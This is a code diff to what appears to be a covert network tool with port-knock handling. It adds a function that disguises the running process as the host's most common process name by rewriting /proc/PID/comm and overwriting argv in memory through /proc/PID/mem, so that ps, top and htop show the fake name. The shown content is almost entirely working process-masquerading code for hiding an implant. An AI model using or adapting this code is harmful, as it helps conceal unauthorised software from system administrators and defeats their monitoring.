@@ -693,9 +693,64 @@ def most_common_process():
     return name
 
 
-def rename_process(new_name):
-    libc = ctypes.CDLL("libc.so.6")
-    libc.prctl(15, new_name.encode(), 0, 0, 0)
+def conceal_process_name(name: str):
+    # Set /proc/PID/comm (shown by ps -a, top, htop)
+    try:
+        with open(f"/proc/{os.getpid()}/comm", "w") as f:
+            f.write(name[:15])
+    except OSError as e:
+        print(f"[!] Could not set comm: {e}")
+
+    # Overwrite /proc/PID/cmdline (shown by ps -aux, ps -ef)
+    try:
+        with open(f"/proc/{os.getpid()}/cmdline", "rb") as f:
+            original = f.read()
+        budget = len(original)
+
+        replacement = name.encode() + b'\x00' * (budget - len(name))
+        replacement = replacement[:budget]
+
+        argc = ctypes.c_int(0)
+        argv = ctypes.POINTER(ctypes.c_wchar_p)()
+        ctypes.pythonapi.Py_GetArgcArgv(
+            ctypes.byref(argc),
+            ctypes.byref(argv)
+        )
+
+        # Find the start address of the cmdline region via /proc/PID/maps.
+        maps_file = f"/proc/{os.getpid()}/maps"
+        mem_file  = f"/proc/{os.getpid()}/mem"
+
+        cmdline_addr = None
+        with open(maps_file, "r") as maps:
+            for line in maps:
+                # The [stack] region contains argv on Linux
+                if "[stack]" in line:
+                    # argv bytes are near the top of the stack (high address).
+                    # More reliably: scan the mapping for our original argv[0].
+                    parts = line.split()
+                    start, end = (int(x, 16) for x in parts[0].split("-"))
+                    with open(mem_file, "rb") as mem:
+                        # Read the top portion of the stack where argv lives
+                        scan_start = max(start, end - 0x10000)
+                        mem.seek(scan_start)
+                        chunk = mem.read(end - scan_start)
+                        needle = sys.argv[0].encode() + b'\x00'
+                        idx = chunk.find(needle)
+                        if idx != -1:
+                            cmdline_addr = scan_start + idx
+                    break
+
+        if cmdline_addr is not None:
+            with open(mem_file, "wb") as mem:
+                mem.seek(cmdline_addr)
+                mem.write(replacement)
+            print(f"[*] cmdline overwritten at 0x{cmdline_addr:x}")
+        else:
+            print("[!] Could not locate argv[0] in stack — cmdline not overwritten")
+
+    except OSError as e:
+        print(f"[!] Could not overwrite cmdline: {e}")
 
 
 def main():
@@ -704,7 +759,7 @@ def main():
     print()
     name = most_common_process()
     if name:
-        rename_process(name)
+        conceal_process_name(name)
     # Parse optional knock sequence from cmdline args
     if len(sys.argv) >= 4:
         try:
